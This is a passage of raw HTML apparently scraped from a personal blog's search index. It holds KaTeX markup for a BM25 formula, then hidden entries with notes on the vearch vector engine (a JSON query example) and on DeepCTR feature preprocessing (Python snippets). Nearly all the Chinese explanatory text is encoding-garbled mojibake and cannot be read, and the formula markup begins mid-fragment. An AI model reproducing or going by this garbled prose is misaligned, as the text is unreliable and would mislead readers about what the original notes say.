class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.229291em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.399108em;vertical-align:-0.972108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.427em;&#34;&gt;&lt;span style=&#34;top:-2.314em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.28055599999999997em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.972108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
">TF-IDF/BM25</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/xiang-liang-yin-qing-vearch/"" data-c="
          &lt;p&gt;vearchåŸºäºFaisså®ç°ï¼Œä½† Faiss æœ¬èº«åªæ˜¯ä¸€ä¸ªèƒ½å¤Ÿå•æœºè¿è¡Œçš„æ”¯æŒå„ç§å‘é‡æ£€ç´¢æ¨¡å‹çš„æœºå™¨å­¦ä¹ ç®—æ³•åŸºç¡€åº“ï¼Œä¸æ”¯æŒåˆ†å¸ƒå¼ã€å®æ—¶ç´¢å¼•å’Œæ£€ç´¢ï¼ŒåŒæ—¶ä¹Ÿä¸æ”¯æŒæ ‡é‡å­—æ®µçš„å­˜å‚¨å’Œç´¢å¼•ç­‰ç­‰ã€‚&lt;/p&gt;
&lt;p&gt;ä¸»è¦åº”ç”¨åœºæ™¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å›¾åƒ/è§†é¢‘/éŸ³é¢‘æ£€ç´¢å’Œå»é‡ï¼›&lt;/li&gt;
&lt;li&gt;å®‰é˜²é¢†åŸŸè§†é¢‘æ™ºèƒ½ç›‘æ§ï¼›&lt;/li&gt;
&lt;li&gt;æ–‡æœ¬ç›¸ä¼¼åº¦è®¡ç®—ï¼›&lt;/li&gt;
&lt;li&gt;æ¨èï¼Œæœç´¢å¬å›åŠæ’åºã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;case&#34;&gt;CASE&lt;/h2&gt;
&lt;h3 id=&#34;1-äººè„¸æ•°æ®æŸ¥æ‰¾ç´¢å¼•&#34;&gt;1. äººè„¸æ•°æ®æŸ¥æ‰¾ç´¢å¼•&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657552893-TyWbGK-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2-åœ¨çº¿ç›¸ä¼¼æ€§å›¾ç‰‡æœç´¢&#34;&gt;2. åœ¨çº¿ç›¸ä¼¼æ€§å›¾ç‰‡æœç´¢&lt;/h3&gt;
&lt;p&gt;ä¾‹å¦‚ç”µå•†å¹³å°çš„æœåŒæ¬¾ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657552967-UpzLvJ-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;vearchå¯¹å¤–æä¾›Restful APIï¼Œæ–¹ä¾¿å¯¹è¡¨åŠæ•°æ®è¿›è¡Œç®¡ç†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;3-å›¾ç‰‡å»é‡&#34;&gt;3. å›¾ç‰‡å»é‡&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://pic.leetcode-cn.com/1657553029-KzTWmq-image.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4-æœç´¢æ¨èç³»ç»Ÿçš„å¬å›&#34;&gt;4. æœç´¢/æ¨èç³»ç»Ÿçš„å¬å›&lt;/h3&gt;
&lt;p&gt;å°†æ•°æ®çš„å„ç§ç‰¹å¾embeddingæˆå‘é‡åï¼Œåˆ©ç”¨å‘é‡ç›¸ä¼¼æ€§æ£€ç´¢åšå¬å›ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä½¿ç”¨&#34;&gt;ä½¿ç”¨&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.mianshigee.com/tutorial/vearch-zh/quickstart.md&#34;&gt;æ•™ç¨‹æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;p&gt;æŸ¥è¯¢&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{
    &amp;quot;query&amp;quot;: {
        &amp;quot;sum&amp;quot;: [{ // æŸ¥è¯¢ç‰¹å¾ï¼Œæ”¯æŒå¤šä¸ª
            &amp;quot;field&amp;quot;: &amp;quot;field_name&amp;quot;, // æŒ‡å®šåˆ›å»ºè¡¨æ—¶ç‰¹å¾å­—æ®µçš„åç§°
            &amp;quot;feature&amp;quot;: [0.1, 0.2, 0.3, 0.4, 0.5], // ä¼ é€’ç‰¹å¾ï¼Œç»´æ•°å’Œå®šä¹‰è¡¨ç»“æ„æ—¶ç»´æ•°å¿…é¡»ç›¸åŒ
            &amp;quot;min_score&amp;quot;: 0.9, // æŒ‡å®šè¿”å›ç»“æœä¸­åˆ†å€¼å¿…é¡»å¤§äºç­‰äº0.9ï¼Œä¸¤ä¸ªå‘é‡è®¡ç®—ç»“æœç›¸ä¼¼åº¦åœ¨0-1ä¹‹é—´ï¼Œmin_scoreå¯ä»¥æŒ‡å®šè¿”å›ç»“æœåˆ†å€¼æœ€å°å€¼ï¼Œmax_scoreå¯ä»¥æŒ‡å®šæœ€å¤§å€¼
            &amp;quot;boost&amp;quot;: 0.5 // boostæŒ‡å®šç›¸ä¼¼åº¦çš„æƒé‡ï¼Œæ¯”å¦‚ä¸¤ä¸ªå‘é‡ç›¸ä¼¼åº¦åˆ†å€¼æ˜¯0.7ï¼Œboostè®¾ç½®æˆ0.5ä¹‹å,è¿”å›çš„ç»“æœä¸­ä¼šå°†åˆ†å€¼0.7ä¹˜ä»¥0.5å³0.35ã€‚
        }],
        &amp;quot;filter&amp;quot;: [{ // è¿‡æ»¤æ¡ä»¶(æ•°å€¼ã€æ ‡ç­¾è¿‡æ»¤)ï¼Œæ”¯æŒå¤šä¸ª
            &amp;quot;range&amp;quot;: { 
                &amp;quot;field_name&amp;quot;: {
                    &amp;quot;gte&amp;quot;: 160,
                    &amp;quot;lte&amp;quot;: 180
                }
            }
// range æŒ‡å®šä½¿ç”¨æ•°å€¼å­—æ®µinteger/float è¿‡æ»¤ï¼Œ filed_nameæ˜¯æ•°å€¼å­—æ®µåç§°ï¼Œ 
// gteã€lteæŒ‡å®šèŒƒå›´ï¼Œ lte å°äºç­‰äºï¼Œ gteå¤§äºç­‰äºï¼Œè‹¥ä½¿ç”¨ç­‰å€¼è¿‡æ»¤ï¼Œlteå’Œgteè®¾ç½®ç›¸åŒçš„å€¼ã€‚
// ä¸Šè¿°ç¤ºä¾‹è¡¨ç¤ºæŸ¥è¯¢field_nameå­—æ®µå¤§äºç­‰äº160å°äºç­‰äº180åŒºé—´çš„å€¼
        },
        {
             &amp;quot;term&amp;quot;: {
                 &amp;quot;field_name&amp;quot;: [&amp;quot;100&amp;quot;, &amp;quot;200&amp;quot;, &amp;quot;300&amp;quot;],
                 &amp;quot;operator&amp;quot;: &amp;quot;or&amp;quot;
             }
// term ä½¿ç”¨æ ‡ç­¾è¿‡æ»¤ï¼Œ field_nameæ˜¯å®šä¹‰çš„æ ‡ç­¾å­—æ®µï¼Œå…è®¸ä½¿ç”¨å¤šä¸ªå€¼è¿‡æ»¤ï¼Œ
// å¯ä»¥æ±‚äº¤â€œoperatorâ€: â€œorâ€ , æ±‚å¹¶: â€œoperatorâ€: â€œandâ€ï¼Œä¸Šè¿°ç¤ºä¾‹è¡¨ç¤ºæŸ¥è¯¢field_nameå­—æ®µå€¼æ˜¯â€100â€ã€â€200â€ æˆ–â€300â€çš„å€¼ã€‚
        }]
    },
    &amp;quot;direct_search_type&amp;quot;: 0, // direct_search_type æŒ‡å®šæŸ¥è¯¢ç±»å‹ï¼Œ0ä»£è¡¨è‹¥ç‰¹å¾å·²ç»åˆ›å»ºç´¢å¼•åˆ™ä½¿ç”¨ç´¢å¼•ï¼Œè‹¥æ²¡æœ‰åˆ›å»ºåˆ™æš´åŠ›æœç´¢ï¼› -1 ä»£è¡¨åªä½¿ç”¨ç´¢å¼•è¿›è¡Œæœç´¢ï¼Œ 1ä»£è¡¨ä¸ä½¿ç”¨ç´¢å¼•åªè¿›è¡Œæš´åŠ›æœç´¢ã€‚é»˜è®¤å€¼æ˜¯0ã€‚
    &amp;quot;quick&amp;quot;: false, // quick æœç´¢ç»“æœé»˜è®¤å°†PQå¬å›å‘é‡è¿›è¡Œè®¡ç®—å’Œç²¾æ’ï¼Œä¸ºäº†åŠ å¿«æœåŠ¡ç«¯å¤„ç†é€Ÿåº¦è®¾ç½®æˆtrueå¯ä»¥æŒ‡å®šåªå¬å›ï¼Œä¸åšè®¡ç®—å’Œç²¾æ’ã€‚
    &amp;quot;vector_value&amp;quot;: false, // vector_valueä¸ºäº†å‡å°ç½‘ç»œå¼€é”€ï¼Œæœç´¢ç»“æœä¸­é»˜è®¤ä¸åŒ…å«ç‰¹å¾æ•°æ®åªåŒ…å«æ ‡é‡ä¿¡æ¯å­—æ®µï¼Œè®¾ç½®æˆtrueæŒ‡å®šè¿”å›ç»“æœä¸­åŒ…å«åŸå§‹ç‰¹å¾æ•°æ®ã€‚
    &amp;quot;online_log_level&amp;quot;: &amp;quot;debug&amp;quot;,
    &amp;quot;size&amp;quot;: 10 // è¿”å›ç»“æœæ•°é‡
}
&lt;/code&gt;&lt;/pre&gt;
">å‘é‡å¼•æ“vearch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/deepctr-te-zheng-chu-li/"" data-c="
          &lt;p&gt;åŸºäºDNNçš„CTRé¢„æµ‹æ¨¡å‹åŸºæœ¬åŒ…å«å››ä¸ªæ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Input&lt;/li&gt;
&lt;li&gt;Embedding&lt;/li&gt;
&lt;li&gt;Low-order&amp;amp;High-order Feature Extractor&lt;/li&gt;
&lt;li&gt;Prediction&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç‰¹å¾å¤„ç†&#34;&gt;ç‰¹å¾å¤„ç†&lt;/h2&gt;
&lt;h3 id=&#34;æ ‡ç­¾ç¼–ç &#34;&gt;æ ‡ç­¾ç¼–ç &lt;/h3&gt;
&lt;p&gt;ä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•å¯¹ç‰¹å¾è¿›è¡Œç¼–ç ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ˜ å°„ï¼šå³å°†ç‰¹å¾æ˜ å°„åˆ°&lt;code&gt;0~len(#unique)-1&lt;/code&gt;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;for feat in sparse_features:
    lbe = LabelEncoder()
    data[feat] = lbe.fit_transform(data[feat])
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;å“ˆå¸Œç¼–ç ï¼šå°†ç‰¹å¾æ˜ å°„åˆ°å›ºå®šèŒƒå›´ï¼Œä¾‹å¦‚&lt;code&gt;0~9999&lt;/code&gt;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# åœ¨è®­ç»ƒå‰
for feat in sparse_features:
    lbe = HashEncoder()
    data[feat] = lbe.transform(data[feat])
&lt;/code&gt;&lt;/pre&gt;
æˆ–&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­åŠ¨æ€æ‰§è¡Œç‰¹å¾å“ˆå¸Œ
# åœ¨SparseFeatæˆ–VarlenSparseFeatä¸­å°†use_hashè®¾ä¸ºTrue
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯¹äºå¯†é›†çš„æ•°å€¼ç‰¹å¾ï¼Œé€šå¸¸å°†å…¶ç¦»æ•£ä¸ºæ¡¶ï¼Œ&lt;em&gt;å¯ä»¥ä½¿ç”¨å½’ä¸€åŒ–å¤„ç†&lt;/em&gt;ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;mms = MinMaxScaler(feature_range=(0,1))
data[dense_features] = mms.fit_transform(data[dense_features])
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç”Ÿæˆç‰¹å¾columns&#34;&gt;ç”Ÿæˆç‰¹å¾columns&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;åœ¨Inputå±‚ä¹‹å‰éœ€è¦å¯¹dataç‰¹å¾è¿›è¡Œå›ºå®šæ ¼å¼çš„ç»„ç»‡ï¼Œå³è½¬æ¢ä¸ºDeepCTRä¸­å®šä¹‰çš„ç±»å‹ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;åœ¨æ¨èç³»ç»Ÿä¸­ï¼Œé€šå¸¸æ•°æ®çš„ç‰¹å¾æœ‰ä»¥ä¸‹å‡ ç±»ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IDç±»ç‰¹å¾ï¼›&lt;/li&gt;
&lt;li&gt;IDåºåˆ—ç‰¹å¾ï¼šä¾‹å¦‚å¸¦æœ‰å…ˆåé¡ºåºçš„è¡Œä¸ºåºåˆ—ã€æ²¡æœ‰å…ˆåé¡ºåºçš„multi-hotç¼–ç çš„IDç‰¹å¾ï¼›&lt;/li&gt;
&lt;li&gt;æ•°å€¼ç‰¹å¾ï¼šä¾‹å¦‚å¹´é¾„ã€è§†é¢‘æ—¶é•¿ã€æ–‡ç« å­—æ•°ç­‰ï¼Œæ•°å€¼å‘é‡ï¼š ä¾‹å¦‚å›¾ç‰‡ã€è§†é¢‘ã€æ–‡æœ¬ç­‰å‘é‡è¡¨ç¤ºã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å¯¹äºä¸Šè¿°ä¸‰ç±»ç‰¹å¾ï¼Œdeepctråˆ†åˆ«å®šä¹‰äº†ä¸‰ç§Feature Columnsï¼š&lt;code&gt;SparseFeat&lt;/code&gt;ã€&lt;code&gt;VarLenSparseFeat&lt;/code&gt;ã€&lt;code&gt;DenseFeat&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸‰ä¸ªç±»æ˜¯æ ‡è®°ç‰¹å¾çš„ï¼Œåœ¨æ„å»ºæ¨¡å‹æ—¶ï¼Œå¯ä»¥é€šè¿‡ç‰¹å¾çš„æ ‡è®°æ¥æ„å»ºä¸åŒçš„Inputå±‚å’ŒEmbeddingå±‚ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SparseFeat(namedtuple(&#39;SparseFeat&#39;,
                            [&#39;name&#39;,  # ç‰¹å¾çš„åç§°
                            &#39;vocabulary_size&#39;,  # idç‰¹å¾çš„è¯å…¸å¤§å°
                            &#39;embedding_dim&#39;,  # idç‰¹å¾è½¬åŒ–æˆå‘é‡çš„ç»´åº¦
                            &#39;use_hash&#39;, 
                            &#39;vocabulary_path&#39;, 
                            &#39;dtype&#39;, 
                            &#39;embeddings_initializer&#39;, # embeddingçš„åˆå§‹åŒ–æ–¹å¼
                            &#39;embedding_name&#39;, 
                            &#39;group_name&#39;, # è¯¥ç‰¹å¾æ‰€å±çš„ç»„
                            &#39;trainable&#39;])): # è¯¥idç±»ç‰¹å¾å¯¹åº”çš„Embeddingå±‚æ˜¯å¦å¯è®­ç»ƒ


class VarLenSparseFeat(namedtuple(&#39;VarLenSparseFeat&#39;,
                                  [&#39;sparsefeat&#39;, 
                                  &#39;maxlen&#39;,  # idåºåˆ—çš„æœ€å¤§é•¿åº¦
                                  &#39;combiner&#39;,  # åºåˆ—ç‰¹å¾èšåˆçš„æ–¹å¼ï¼ˆä¾‹å¦‚mean poolingï¼‰
                                  &#39;length_name&#39;, # åºåˆ—ç‰¹å¾å¯¹åº”çš„æœ‰æ•ˆé•¿åº¦çš„ç‰¹å¾åï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªç‰¹å¾ï¼‰
                                  &#39;weight_name&#39;,  # åºåˆ—ç‰¹å¾å¯¹åº”èšåˆæƒé‡çš„ç‰¹å¾åï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªç‰¹å¾ï¼‰
                                  &#39;weight_norm&#39;])):


class DenseFeat(namedtuple(&#39;DenseFeat&#39;,
                           [&#39;name&#39;,  # æ•°å€¼ç‰¹å¾çš„åç§°
                            &#39;dimension&#39;, # æ•°å€¼ç‰¹å¾çš„ç»´åº¦ï¼Œæ³¨æ„åŒºåˆ†æ˜¯å•ä¸ªæ•°å€¼ç‰¹å¾è¿˜æ˜¯å‘é‡æ•°å€¼ç‰¹å¾
                            &#39;dtype&#39;,  # æ•°å€¼ç±»å‹
                            &#39;transform_fn&#39;])): # æ•°å€¼ç‰¹å¾çš„è½¬æ¢æ–¹å¼ï¼Œä¾‹å¦‚æœ‰äº›ç‰¹å¾éœ€è¦åšlogå˜æ¢
&lt;/code&gt;&lt;/pre&gt;
